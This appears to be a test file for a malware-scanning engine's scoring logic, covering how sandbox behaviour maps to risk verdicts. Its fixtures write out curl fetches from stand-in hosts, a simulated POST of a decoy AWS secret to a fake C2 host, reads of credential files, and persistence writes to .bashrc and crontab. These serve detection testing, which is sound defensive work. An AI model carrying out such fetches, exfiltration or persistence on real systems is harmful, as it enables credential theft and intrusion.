import { test } from "node:test";
import assert from "node:assert/strict";
import {
  BASE_NOT_VERIFIED,
  CAP_FORENSICS_LOST,
  CAP_FORENSICS_PARTIAL,
  CAP_NOT_PROVEN,
  bandFor,
  computeScore,
  deriveBehaviour,
  isPersistencePath,
  isSuspiciousInstallExec,
  isTunnelingDnsName,
  NO_BEHAVIOUR,
  verdictFor,
  type BehaviourSignals,
  type ScoreInput,
} from "../../lib/engine/score.ts";
import type { ReputationSignals } from "../../lib/engine/reputation.ts";
import type { FileEventData, ForgedCallData, ProcessEventData, TaggedCheckFinding, TaggedFinding } from "../../lib/engine/types.ts";

const NO_REP: ReputationSignals = {
  ownerAgeDays: null,
  ownerEstablished: null,
  npmFirstPublishDays: null,
  maintainerChangedWithin30d: null,
  weeklyDownloads: null,
  repoStars: null,
  evidence: [],
  unavailable: [],
};
const STRONG_REP: ReputationSignals = { ...NO_REP, ownerAgeDays: 3000, ownerEstablished: true, weeklyDownloads: 5_000_000 };

function input(over: Partial<ScoreInput> = {}): ScoreInput {
  return {
    behaviour: NO_BEHAVIOUR,
    install: "completed",
    entry: "completed",
    archiveTruncated: false,
    forensics: { coverage: "complete", gaps: [] },
    coverage: { scanners: true, osv: true, checks: true },
    malicious: [],
    staticFindings: [],
    checkFindings: [],
    docs: null,
    capabilities: [],
    reputation: NO_REP,
    failedStages: [],
    ...over,
  };
}
const beh = (b: Partial<BehaviourSignals>): BehaviourSignals => ({ ...NO_BEHAVIOUR, ...b });
const sf = (over: Partial<TaggedFinding>): TaggedFinding => ({
  source: "heuristic",
  rule: "r",
  severity: "high",
  file: "lib/a.js",
  line: 1,
  message: "m",
  reach: "import",
  ...over,
});
const cf = (over: Partial<TaggedCheckFinding>): TaggedCheckFinding => ({
  check: "flagged",
  question: "window_0",
  file: "lib/a.js",
  line: 9,
  severity: "high",
  verdict: "malicious",
  probability: 0.93,
  title: "t",
  evidence: ["lib/a.js:1-24 p=0.93"],
  reach: "import",
  ...over,
});

const CASES: Array<{ name: string; in: Partial<ScoreInput>; score: number; verdict: string }> = [
  { name: "clean run, no reputation signals", in: {}, score: 90, verdict: "No threats observed" },
  { name: "clean run with established owner and downloads", in: { reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "clean established GitHub repo with 1000+ stars reaches 90", in: { reputation: { ...NO_REP, ownerAgeDays: 3000, ownerEstablished: true, repoStars: 1000 } }, score: 90, verdict: "No threats observed" },
  { name: "999 stars earn no popularity point", in: { reputation: { ...NO_REP, ownerAgeDays: 3000, ownerEstablished: true, repoStars: 999 } }, score: 90, verdict: "No threats observed" },
  { name: "stars plus downloads stay within the reputation bound", in: { reputation: { ...STRONG_REP, repoStars: 50_000 } }, score: 90, verdict: "No threats observed" },
  { name: "one canary hit alone lands under 30", in: { behaviour: beh({ canaryHits: ["AWS_SECRET_ACCESS_KEY sent to c2.example"] }) }, score: 15, verdict: "Malicious" },
  { name: "canary with strong reputation is still capped at 15", in: { behaviour: beh({ canaryHits: ["x"] }), reputation: STRONG_REP }, score: 15, verdict: "Malicious" },
  { name: "decoy credential read", in: { behaviour: beh({ decoyReads: ["/home/cr/.ssh/id_rsa"] }) }, score: 50, verdict: "High risk" },
  { name: "persistence write is capped at 15", in: { behaviour: beh({ persistenceWrites: ["/home/cr/.bashrc"] }) }, score: 15, verdict: "Malicious" },
  { name: "DNS tunneling shape", in: { behaviour: beh({ tunnelingDns: ["x.evil.example"] }) }, score: 55, verdict: "High risk" },
  { name: "one non-distribution host", in: { behaviour: beh({ nonDistributionHosts: ["c2.example"] }) }, score: 60, verdict: "Caution" },
  { name: "two non-distribution hosts hit the -45 cap", in: { behaviour: beh({ nonDistributionHosts: ["a.example", "b.example"] }) }, score: 40, verdict: "High risk" },
  { name: "three non-distribution hosts stay at -45", in: { behaviour: beh({ nonDistributionHosts: ["a", "b", "c"] }) }, score: 40, verdict: "High risk" },
  { name: "TLS interception refused", in: { behaviour: beh({ tlsRefused: ["pinned.example"] }) }, score: 65, verdict: "Caution" },
  { name: "one install-hook exec", in: { behaviour: beh({ suspiciousInstallExecs: ["curl -s x"] }) }, score: 70, verdict: "Caution" },
  { name: "three install-hook execs cap at -30", in: { behaviour: beh({ suspiciousInstallExecs: ["curl", "wget", "nc"] }) }, score: 55, verdict: "High risk" },
  { name: "a distribution fetch (prebuilt binary, release asset) costs nothing on its own", in: { behaviour: beh({ distributionFetches: ["github.com"] }) }, score: 90, verdict: "No threats observed" },
  { name: "four distribution fetches still cost nothing", in: { behaviour: beh({ distributionFetches: ["a", "b", "c", "d"] }) }, score: 90, verdict: "No threats observed" },
  { name: "behaviour group floors at -85", in: { behaviour: beh({ decoyReads: ["a"], tunnelingDns: ["b"], tlsRefused: ["c"], nonDistributionHosts: ["d", "e"] }) }, score: 0, verdict: "Malicious" },
  { name: "a malicious dependency with clean own code is a labelled dependency danger in Caution", in: { malicious: [{ ecosystem: "npm", name: "evil", version: "1.0.0", ids: ["MAL-2025-1"] }], reputation: STRONG_REP }, score: 74, verdict: "Caution" },
  { name: "one reachable high static finding: pattern hits alone keep Low risk (read only, never seen running: not verified, no points)", in: { staticFindings: [sf({})] }, score: 85, verdict: "Low risk" },
  { name: "one reachable medium static finding (read only, never seen running: not verified, no points)", in: { staticFindings: [sf({ severity: "medium" })] }, score: 90, verdict: "No threats observed" },
  { name: "low static finding is worth 0", in: { staticFindings: [sf({ severity: "low" })] }, score: 90, verdict: "No threats observed" },
  { name: "unreachable high finding changes nothing", in: { staticFindings: [sf({ reach: "unreachable", file: "test/a.js" })], reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "same file:line from two scanners counts once at the worst weight (read only, never seen running: not verified, no points)", in: { staticFindings: [sf({ source: "semgrep" }), sf({ source: "yara", severity: "medium" })] }, score: 85, verdict: "Low risk" },
  { name: "static pattern hits alone keep a complete scan at Low risk, as a partial one (read only, never seen running: not verified, no points)", in: { staticFindings: [1, 2, 3, 4, 5].map((line) => sf({ line })) }, score: 85, verdict: "Low risk" },
  { name: "Jev malicious high (read only, never seen running: not verified, no points)", in: { checkFindings: [cf({})] }, score: 85, verdict: "Low risk" },
  { name: "Jev suspicious medium (read only, never seen running: not verified, no points)", in: { checkFindings: [cf({ severity: "medium", verdict: "suspicious" })] }, score: 90, verdict: "No threats observed" },
  { name: "Jev benign answer is worth 0", in: { checkFindings: [cf({ verdict: "benign", severity: "low" })] }, score: 90, verdict: "No threats observed" },
  { name: "Jev unclear answer is worth 0 points and does not block 90 (it is listed as not verified)", in: { checkFindings: [cf({ verdict: "unclear", severity: "low" })], reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "Jev answer on an unreachable file is worth 0", in: { checkFindings: [cf({ reach: "unreachable" })] }, score: 90, verdict: "No threats observed" },
  { name: "Jev and static on the same line dedup to the worst (read only, never seen running: not verified, no points)", in: { staticFindings: [sf({ line: 9 })], checkFindings: [cf({})] }, score: 85, verdict: "Low risk" },
  {
    name: "docs no-network contradicted by behaviour",
    in: { docs: { declaresNoNetwork: true, declaresPure: false, quote: "makes no network requests" }, behaviour: beh({ nonDistributionHosts: ["c2.example"] }) },
    score: 45,
    verdict: "High risk",
  },
  {
    name: "docs no-network contradicted by reachable static capability only (read only, never seen running: not verified, no points)",
    in: { docs: { declaresNoNetwork: true, declaresPure: false, quote: "offline" }, capabilities: [{ file: "lib/a.js", capability: "network", reach: "import" }] },
    score: 90,
    verdict: "No threats observed",
  },
  {
    name: "docs no-network with only unreachable network capability",
    in: { docs: { declaresNoNetwork: true, declaresPure: false, quote: "offline" }, capabilities: [{ file: "test/a.js", capability: "network", reach: "unreachable" }] },
    score: 90,
    verdict: "No threats observed",
  },
  {
    name: "docs pure contradicted by reachable process capability (read only, never seen running: not verified, no points)",
    in: { docs: { declaresNoNetwork: false, declaresPure: true, quote: "pure functions" }, capabilities: [{ file: "a.js", capability: "process", reach: "install" }] },
    score: 90,
    verdict: "No threats observed",
  },
  { name: "new GitHub owner is shown but takes nothing off", in: { reputation: { ...NO_REP, ownerAgeDays: 10 } }, score: 90, verdict: "No threats observed" },
  {
    name: "every negative reputation signal together still takes nothing off",
    in: { reputation: { ...NO_REP, ownerAgeDays: 5, npmFirstPublishDays: 3, maintainerChangedWithin30d: true } },
    score: 90,
    verdict: "No threats observed",
  },
  { name: "install failed caps at 74", in: { install: "failed" }, score: 74, verdict: "Caution" },
  { name: "install timeout: the program never ran, so a partial scan at 80", in: { install: "timeout", entry: "skipped", reputation: STRONG_REP }, score: 80, verdict: "Low risk" },
  { name: "entry timeout never lowers the score", in: { entry: "timeout", reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "install skipped caps at 74", in: { install: "skipped", entry: "skipped" }, score: 74, verdict: "Caution" },
  { name: "archive truncated caps at 74", in: { archiveTruncated: true }, score: 74, verdict: "Caution" },
  { name: "lost forensics: not observed-clean, and without behaviour not High risk either (Caution 60)", in: { forensics: { coverage: "lost", gaps: [] }, reputation: STRONG_REP }, score: 60, verdict: "Caution" },
  { name: "lost forensics after an overrun: timeout plus lost caps at 59", in: { install: "timeout", entry: "skipped", forensics: { coverage: "lost", gaps: [] } }, score: 60, verdict: "Caution" },
  { name: "partial forensics caps at 74", in: { forensics: { coverage: "partial", gaps: ["capture.jsonl was cut at 8 MB."] }, reputation: STRONG_REP }, score: 74, verdict: "Caution" },
  { name: "entry skipped (no program ran after the build): a partial scan at 80", in: { entry: "skipped", reputation: STRONG_REP }, score: 80, verdict: "Low risk" },
  { name: "entry failed (library entry) is neutral", in: { entry: "failed", reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "scanner coverage missing blocks 90", in: { coverage: { scanners: false, osv: true, checks: true }, reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
  { name: "OSV coverage missing blocks 90", in: { coverage: { scanners: true, osv: false, checks: true }, reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
  { name: "Jev check coverage missing blocks 90", in: { coverage: { scanners: true, osv: true, checks: false }, reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
  { name: "negative reputation alone takes nothing off", in: { reputation: { ...STRONG_REP, maintainerChangedWithin30d: true, npmFirstPublishDays: 2, ownerAgeDays: 10, ownerEstablished: false, weeklyDownloads: 0 } }, score: 90, verdict: "No threats observed" },
];

// The two real runs this rule set is held to (docs/runs/2.0-keyday.md steps 10 and 11):
// expressjs/express at 0dee2c5, whose install ran `bash -c "npm install"` (the
// harness) and npm's own `sh -c` lifecycle scripts and fetched only from the npm
// registry, and the phone-home fixture, which POSTs the decoy AWS credentials to a
// forged host during install.
const EXPRESS_FORGED: ForgedCallData[] = [
  { phase: "install", proto: "dns", host: "registry.npmjs.org", port: 53, req_bytes: 36, forged_kind: "dns", canary_hits: [] },
  { phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "GET", path: "/body-parser", req_bytes: 300, forged_kind: "registry", tls: "intercepted", canary_hits: [] },
  { phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "GET", path: "/debug/-/debug-4.4.3.tgz", req_bytes: 300, forged_kind: "registry", tls: "intercepted", canary_hits: [] },
];
const EXPRESS_PROCS: ProcessEventData[] = [
  { phase: "install", pid: 1789, ppid: 0, argv: ["bash", "-c", "npm install --prefer-offline --no-audit --no-fund"] },
  { phase: "install", pid: 1790, ppid: 1789, argv: ["npm", "install", "--prefer-offline", "--no-audit", "--no-fund"] },
  { phase: "install", pid: 1801, ppid: 1790, argv: ["sh", "-c", "npm install"] },
  { phase: "install", pid: 1802, ppid: 1790, argv: ["sh", "-c", "node build.js"] },
];

test("score: express at 0dee2c5 (ordinary install, registry only) is in the top band with no deduction", () => {
  const behaviour = deriveBehaviour({ forgedCalls: EXPRESS_FORGED, files: [], processes: EXPRESS_PROCS, canaryInFiles: [], datagramEgress: [] });
  assert.deepEqual(behaviour, NO_BEHAVIOUR, "the harness shell, npm lifecycle shells and registry traffic are not behaviour");
  const r = computeScore(input({ behaviour, reputation: STRONG_REP }));
  assert.equal(r.verdict, "No threats observed");
  assert.ok(r.score >= 90, `score ${r.score}`);
  assert.deepEqual(r.breakdown.filter((d) => d.points < 0), [], "nothing is taken off");
  assert.ok(r.notVerified.length >= BASE_NOT_VERIFIED.length, "still never a bare Safe");
});

test("score: the phone-home fixture (forged call with the decoy credential plus a decoy read) is Malicious 0", () => {
  const behaviour = deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] });
  const r = computeScore(input({ behaviour, reputation: NO_REP }));
  assert.equal(r.verdict, "Malicious");
  assert.equal(r.score, 0);
});

test("score: every point taken off cites evidence", () => {
  const cases: Partial<ScoreInput>[] = [
    { behaviour: deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] }) },
    { behaviour: beh({ suspiciousInstallExecs: ["curl -fsSL https://x.example/i.sh"], tlsRefused: ["pinned.example"], persistenceWrites: ["/home/cr/.bashrc"] }) },
    { docs: { declaresNoNetwork: true, declaresPure: false, quote: "Makes no network requests." }, behaviour: beh({ distributionFetches: ["github.com"] }) },
    { checkFindings: [cf({ verdict: "malicious", severity: "high" })] },
    { reputation: { ...NO_REP, ownerAgeDays: 5, npmFirstPublishDays: 3, maintainerChangedWithin30d: true } },
  ];
  for (const c of cases) {
    const r = computeScore(input(c));
    for (const d of r.breakdown.filter((x) => x.points < 0 && x.group !== "cap" && x.code !== "behaviour_floor")) {
      assert.ok((d.evidence ?? []).some((e) => e.trim().length > 0), `${d.code} took ${d.points} without evidence`);
    }
  }
  // A docs contradiction with no quoted sentence cannot be cited, so it does not apply.
  const unquoted = computeScore(input({ docs: { declaresNoNetwork: true, declaresPure: false, quote: null }, behaviour: beh({ distributionFetches: ["github.com"] }) }));
  assert.ok(!unquoted.breakdown.some((d) => d.code === "docs_contradicted_by_behaviour"));
});

test("score: a build that ran out of time is a partial scan at 80 with its reason line", () => {
  const done = computeScore(input({ reputation: STRONG_REP }));
  assert.equal(done.score, 90);
  assert.equal(done.partial, false);
  assert.equal(done.partialReason, undefined);
  const timedOut = computeScore(input({ install: "timeout", entry: "skipped", reputation: STRONG_REP }));
  assert.equal(timedOut.score, 80);
  assert.equal(timedOut.partial, true);
  assert.equal(timedOut.partialReason, "Build ran out of time, so the program never ran");
  assert.ok(timedOut.breakdown.some((b) => b.code === "cap_partial_run" && /^Partial scan: Build ran out of time/.test(b.detail)));
  const text = timedOut.notVerified.join(" ");
  assert.match(text, /Install phase did not complete \(timeout\)/);
  assert.match(text, /Entry phase was skipped/);
});

test("score: above 80 needs the build to complete and the program to run, in every case", () => {
  const cases: Array<[Partial<ScoreInput>, number, string | undefined]> = [
    [{ install: "completed", entry: "completed" }, 90, undefined],
    [{ install: "completed", entry: "failed" }, 90, undefined],
    [{ install: "completed", entry: "timeout" }, 90, undefined],
    [{ install: "completed", entry: "skipped" }, 80, "Build finished, but there was no program to run"],
    [{ install: "timeout", entry: "skipped" }, 80, "Build ran out of time, so the program never ran"],
    [{ install: "none", entry: "skipped" }, 80, "Nothing to build: no package.json, go.mod, Cargo.toml, pyproject.toml, setup.py, requirements.txt or Makefile"],
    [{ install: "failed", entry: "skipped" }, 74, "Build failed, so the program never ran"],
  ];
  for (const [over, score, reason] of cases) {
    const r = computeScore(input({ ...over, reputation: STRONG_REP }));
    assert.equal(r.score, score, JSON.stringify(over));
    assert.equal(r.partial, reason !== undefined, JSON.stringify(over));
    assert.equal(r.partialReason, reason, JSON.stringify(over));
  }
});

for (const c of CASES) {
  test(`score: ${c.name}`, () => {
    const r = computeScore(input(c.in));
    assert.equal(r.score, c.score);
    assert.equal(r.verdict, c.verdict);
    assert.notEqual(r.verdict as string, "Safe");
    assert.ok(r.notVerified.length >= BASE_NOT_VERIFIED.length);
    for (const b of BASE_NOT_VERIFIED) assert.ok(r.notVerified.includes(b));
    const sum = 85 + r.breakdown.filter((d) => d.group !== "cap").reduce((s, d) => s + d.points, 0);
    assert.equal(Math.min(100, Math.max(0, sum)), r.raw, "breakdown sums to the raw score");
    const capped = r.raw + r.breakdown.filter((d) => d.group === "cap").reduce((s, d) => s + d.points, 0);
    assert.equal(capped, r.score, "caps in the breakdown explain the final score");
  });
}

test("score: behaviour outweighs static (max static loss is smaller than one canary)", () => {
  const hits = Array.from({ length: 20 }, (_, i) => sf({ line: i + 1 }));
  const worstStatic = computeScore(input({ staticFindings: hits }));
  const oneCanary = computeScore(input({ behaviour: beh({ canaryHits: ["x"] }) }));
  assert.ok(worstStatic.score > oneCanary.score);
  // Read only, never seen running: no points, stated under not verified.
  assert.equal(worstStatic.groups.static, 0);
  assert.ok(worstStatic.notVerified.some((l) => /read but never seen doing anything/.test(l)));
  // With bad behaviour observed in the same run, the read findings count in full.
  assert.equal(computeScore(input({ staticFindings: hits, behaviour: beh({ canaryHits: ["x"] }) })).groups.static, -40);
});

test("score: failed phases and coverage gaps are listed in not_verified", () => {
  const r = computeScore(input({ install: "timeout", coverage: { scanners: false, osv: false, checks: false }, failedStages: ["Stage osv passed its deadline."], reputation: { ...NO_REP, unavailable: ["npm download counts"] } }));
  const text = r.notVerified.join("\n");
  assert.match(text, /Install phase did not complete \(timeout\)/);
  assert.match(text, /Static scanners/);
  assert.match(text, /OSV malicious-package lookup/);
  assert.match(text, /Jev checks did not complete/);
  assert.match(text, /npm download counts/);
  assert.match(text, /Stage osv passed its deadline/);
});

test("verdict words and bands at every boundary; never Safe", () => {
  const table: Array<[number, string, string]> = [
    [100, "No threats observed", "green"],
    [90, "No threats observed", "green"],
    [89, "Low risk", "blue"],
    [80, "Low risk", "blue"],
    [79, "Caution", "yellow"],
    [60, "Caution", "yellow"],
    [59, "High risk", "red"],
    [30, "High risk", "red"],
    [29, "Malicious", "red"],
    [0, "Malicious", "red"],
  ];
  for (const [s, v, b] of table) {
    assert.equal(verdictFor(s), v);
    assert.equal(bandFor(s), b);
    assert.doesNotMatch(verdictFor(s), /\bsafe\b/i);
  }
});

test("behaviour classifiers", () => {
  assert.equal(isTunnelingDnsName("a9f3k2l1m8n7b6v5c4x3z2q1w0e9r8t7y6u5i4o3p2.evil.example"), true);
  assert.equal(isTunnelingDnsName("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example"), false);
  assert.equal(isTunnelingDnsName("www.example.com"), false);
  assert.equal(isPersistencePath("/home/cr/.bashrc"), true);
  assert.equal(isPersistencePath("/home/cr/.config/systemd/user/x.service"), true);
  assert.equal(isPersistencePath("/home/cr/.ssh/authorized_keys"), true);
  assert.equal(isPersistencePath("/etc/hosts"), true);
  assert.equal(isPersistencePath("/work/app/node_modules/x/.profile.js"), false);
  assert.equal(isSuspiciousInstallExec(["/usr/bin/curl", "-s", "x"]), true);
  assert.equal(isSuspiciousInstallExec(["bash", "-c", "x"]), false, "a shell is how npm and the harness run every script");
  assert.equal(isSuspiciousInstallExec(["bash", "-c", "npm install --no-audit --no-fund"]), false);
  assert.equal(isSuspiciousInstallExec(["sh", "-c", "node beacon.js"]), false);
  assert.equal(isSuspiciousInstallExec(["base64", "-d"]), true);
  assert.equal(isSuspiciousInstallExec(["node", "x.js"]), false);
});

test("deriveBehaviour maps forensics onto behaviour signals", () => {
  const call = (over: Partial<ForgedCallData>): ForgedCallData => ({
    phase: "install",
    proto: "https",
    host: "x",
    port: 443,
    req_bytes: 10,
    forged_kind: "json",
    canary_hits: [],
    ...over,
  });
  const b = deriveBehaviour({
    forgedCalls: [
      call({ host: "registry.npmjs.org", forged_kind: "mirror" }),
      call({ host: "c2.cr-fixture.invalid", proto: "http", port: 80, canary_hits: ["AWS_SECRET_ACCESS_KEY"] }),
      call({ host: "C2.cr-fixture.invalid", phase: "entry" }),
      call({ host: "github.com" }),
      call({ host: "pinned.example", tls: "refused" }),
      call({ host: "a9f3k2l1m8n7b6v5c4x3z2q1w0e9r8t7y6u5i4o3p2.evil.example", proto: "dns", port: 53 }),
      call({ host: "registry.npmjs.org", forged_kind: "json" }),
    ],
    files: [
      { phase: "install", op: "read_decoy", path: "/home/cr/.aws/credentials", pid: 5 },
      { phase: "install", op: "write", path: "/home/cr/.bashrc", pid: 5 },
      { phase: "install", op: "unlink", path: "/home/cr/.profile", pid: 5 },
      { phase: "entry", op: "write", path: "/work/app/out.txt", pid: 6 },
    ],
    processes: [
      { phase: "install", pid: 7, ppid: 1, argv: ["sh", "-c", "node beacon.js"] },
      { phase: "install", pid: 8, ppid: 7, argv: ["/usr/bin/curl", "-s", "http://c2/x"] },
      { phase: "entry", pid: 9, ppid: 1, argv: ["wget", "x"] },
      { phase: "entry", pid: 10, ppid: 1, argv: ["crontab", "/tmp/c"] },
    ],
    canaryInFiles: ["/tmp/stash.txt"],
  });
  assert.deepEqual(b.canaryHits, ["AWS_SECRET_ACCESS_KEY sent to c2.cr-fixture.invalid (http, install)", "canary copied into written file /tmp/stash.txt"]);
  assert.deepEqual(b.nonDistributionHosts, ["c2.cr-fixture.invalid", "pinned.example"]);
  assert.deepEqual(b.distributionFetches, ["github.com"]);
  assert.deepEqual(b.tlsRefused, ["pinned.example"]);
  assert.equal(b.tunnelingDns.length, 1);
  assert.deepEqual(b.decoyReads, ["/home/cr/.aws/credentials"]);
  assert.deepEqual(b.persistenceWrites, ["/home/cr/.bashrc", "crontab /tmp/c"]);
  assert.deepEqual(b.suspiciousInstallExecs, ["/usr/bin/curl -s http://c2/x"]);
  const r = computeScore(input({ behaviour: b }));
  assert.equal(r.score, 0);
  assert.equal(r.verdict, "Malicious");
  assert.equal(r.groups.behaviour, -85);
});

test("score: a lost detonation never outscores an observed attack and never reads as observed-clean", () => {
  const lost = computeScore(input({ install: "timeout", entry: "skipped", forensics: { coverage: "lost", gaps: [] } }));
  const caught = computeScore(input({ behaviour: beh({ canaryHits: ["x"] }) }));
  assert.ok(lost.score <= CAP_NOT_PROVEN);
  assert.equal(lost.verdict, "Caution", "a lost run is not observed-clean, and without behaviour it is not High risk either");
  assert.ok(caught.score < lost.score, "an observed exfiltration still scores below a lost run");
  assert.match(lost.notVerified.join("\n"), /did not produce a forensic record/);
  const partial = computeScore(input({ forensics: { coverage: "partial", gaps: ["trace.install was cut at 8 MB."] } }));
  assert.ok(partial.score <= CAP_FORENSICS_PARTIAL);
  assert.ok(partial.notVerified.includes("trace.install was cut at 8 MB."));
});

// ---- sandbox facts plus Jev answers to the number, end to end in code ------------------------------

const FIXTURE_FORGED: ForgedCallData[] = [
  { phase: "install", proto: "dns", host: "c2.cr-fixture.invalid", port: 53, req_bytes: 40, forged_kind: "dns", canary_hits: [] },
  {
    phase: "install",
    proto: "https",
    host: "c2.cr-fixture.invalid",
    port: 443,
    method: "POST",
    path: "/collect",
    sni: "c2.cr-fixture.invalid",
    req_bytes: 512,
    forged_kind: "json",
    tls: "intercepted",
    canary_hits: ["AWS_SECRET_ACCESS_KEY"],
  },
  { phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "GET", path: "/left-pad", req_bytes: 200, forged_kind: "mirror", tls: "intercepted", canary_hits: [] },
];
const FIXTURE_FILES: FileEventData[] = [{ phase: "install", op: "read_decoy", path: "/home/cr/.aws/credentials", pid: 412 }];
const FIXTURE_PROCS: ProcessEventData[] = [
  { phase: "install", pid: 400, ppid: 1, argv: ["sh", "-c", "node beacon.js"] },
  { phase: "install", pid: 412, ppid: 400, argv: ["node", "beacon.js"] },
];

test("facts to verdict: a forged call to a fake host carrying a planted credential plus a decoy read is flagged Malicious with a low score", () => {
  const behaviour = deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] });
  assert.deepEqual(behaviour.nonDistributionHosts, ["c2.cr-fixture.invalid"], "the registry mirror call is not behaviour");
  assert.equal(behaviour.canaryHits.length, 1);
  assert.deepEqual(behaviour.decoyReads, ["/home/cr/.aws/credentials"]);
  const jev = [cf({ check: "install", question: "file_1", file: "beacon.js", line: null, reach: "install", evidence: ["beacon.js (install surface) p=0.97", "install signal credential access p=0.95"] })];
  // Strong reputation must not lift it: reputation is its own bounded group.
  const r = computeScore(input({ behaviour, checkFindings: jev, reputation: STRONG_REP }));
  assert.equal(r.verdict, "Malicious");
  assert.ok(r.score <= 15, `score ${r.score}`);
  assert.equal(r.band, "red");
  const codes = r.breakdown.map((d) => d.code);
  for (const c of ["canary_exfiltration", "decoy_credential_read", "non_distribution_contact", "reachable_static_findings", "behaviour_floor"]) assert.ok(codes.includes(c), c);
  assert.ok(r.breakdown.find((d) => d.code === "reachable_static_findings")!.evidence!.some((e) => /Jev install check: malicious at beacon\.js/.test(e)));
  assert.ok(r.breakdown.filter((d) => d.group === "reputation").every((d) => d.points >= 0), "reputation stays in its own group");
  assert.ok(r.notVerified.length >= BASE_NOT_VERIFIED.length);
  // Same facts, same answers, same number: no model in the loop.
  assert.deepEqual(computeScore(input({ behaviour, checkFindings: jev, reputation: STRONG_REP })), r);
});

test("facts to verdict: clean facts and benign Jev answers give a high score with a non-empty not-verified list, never Safe", () => {
  const behaviour = deriveBehaviour({ forgedCalls: [FIXTURE_FORGED[2]!], files: [], processes: [{ phase: "install", pid: 400, ppid: 1, argv: ["node", "-e", "1"] }], canaryInFiles: [], datagramEgress: [] });
  assert.deepEqual(behaviour, NO_BEHAVIOUR);
  const r = computeScore(input({ behaviour, checkFindings: [], reputation: STRONG_REP }));
  assert.ok(r.score >= 90, `score ${r.score}`);
  assert.equal(r.verdict, "No threats observed");
  assert.notEqual(r.verdict as string, "Safe");
  assert.ok(r.notVerified.length > 0);
  for (const b of BASE_NOT_VERIFIED) assert.ok(r.notVerified.includes(b));
  // Without Jev coverage the same clean facts stay under 90 and say why.
  const noJev = computeScore(input({ behaviour, coverage: { scanners: true, osv: true, checks: false }, reputation: STRONG_REP }));
  assert.equal(noJev.score, CAP_NOT_PROVEN);
  assert.ok(noJev.notVerified.some((n) => /Jev checks did not complete/.test(n)));
});

test("an unclear Jev answer is listed under not_verified with its location", () => {
  const r = computeScore(input({ checkFindings: [cf({ verdict: "unclear", severity: "low", file: "lib/x.js", line: 4 })] }));
  assert.ok(r.notVerified.some((n) => n.includes("Jev could not decide on 1 reachable location(s): lib/x.js:4 (flagged check)")), JSON.stringify(r.notVerified));
});

test("score: own code clean, danger only in a dependency: labelled, Caution, never Malicious", () => {
  // lodash/lodash 2b5e6f7: package-lock.json pins fsevents 1.2.2 (OSV MAL-2023-462), dev, darwin-only, not installed on Linux.
  const fsevents = { ecosystem: "npm" as const, name: "fsevents", version: "1.2.2", ids: ["MAL-2023-462"], scope: { installed: false, dev: true, optional: true, os: ["darwin"] } };
  // Never installed in this run: the record is stated under not verified and takes no points.
  const absent = computeScore(input({ malicious: [fsevents], reputation: STRONG_REP }));
  assert.ok(absent.score >= 80, String(absent.score));
  assert.ok(!absent.breakdown.some((x) => x.code === "dependency_malicious_record"));
  assert.ok(absent.notVerified.some((l) => /malware record exists for a dependency this run never installed: fsevents 1\.2\.2 \(MAL-2023-462\)/.test(l)));
  // Installed in the run: the record counts.
  const r = computeScore(input({ malicious: [{ ...fsevents, scope: { ...fsevents.scope, installed: true } }], reputation: STRONG_REP }));
  assert.equal(r.verdict, "Caution");
  assert.equal(r.score, 74);
  assert.equal(r.label, "Own code: clean. Danger in a dependency: fsevents 1.2.2 (MAL-2023-462), macOS only, dev lockfile only (repo install, not package users).");
  const d = r.breakdown.find((x) => x.code === "dependency_malicious_record")!;
  assert.ok(d.points < 0 && d.evidence!.includes("npm fsevents@1.2.2: MAL-2023-462"), "the finding stays prominent, with its advisory");
});

test("score: a malicious dependency with bad own code still counts in full", () => {
  const dep = { ecosystem: "npm" as const, name: "evil", version: "1.0.0", ids: ["MAL-2099-1"], scope: { installed: true, dev: false, optional: false, os: [] } };
  const behaviour = deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] });
  const r = computeScore(input({ malicious: [dep], behaviour }));
  assert.equal(r.verdict, "Malicious");
  assert.equal(r.label, undefined);
});

test("score: static hits with bad behaviour are not floored; a registry TLS refusal is not a contact", () => {
  const behaviour = deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] });
  const bad = computeScore(input({ behaviour, staticFindings: [1, 2, 3, 4, 5].map((line) => sf({ line })) }));
  assert.equal(bad.score, 0, "behaviour seen in the sandbox still counts in full");
  const refused = deriveBehaviour({
    forgedCalls: [{ phase: "install", proto: "tcp", host: "registry.npmjs.org", port: 443, req_bytes: 0, forged_kind: "tls_refused", tls: "refused", canary_hits: [] }],
    files: [],
    processes: [],
    canaryInFiles: [],
    datagramEgress: [],
  });
  assert.deepEqual(refused, NO_BEHAVIOUR, "a package manager declining the per-VM CA for the registry is the tool, not the repo");
  const head = deriveBehaviour({
    forgedCalls: [{ phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "HEAD", path: "/@audio%2Fdecode-wma", req_bytes: 0, forged_kind: "json", tls: "intercepted", canary_hits: [] }],
    files: [],
    processes: [],
    canaryInFiles: [],
    datagramEgress: [],
  });
  assert.deepEqual(head, NO_BEHAVIOUR, "pnpm's HEAD existence check on the registry is not a contact");
  const post = deriveBehaviour({
    forgedCalls: [{ phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "PUT", path: "/evil", req_bytes: 900, forged_kind: "json", tls: "intercepted", canary_hits: [] }],
    files: [],
    processes: [],
    canaryInFiles: [],
    datagramEgress: [],
  });
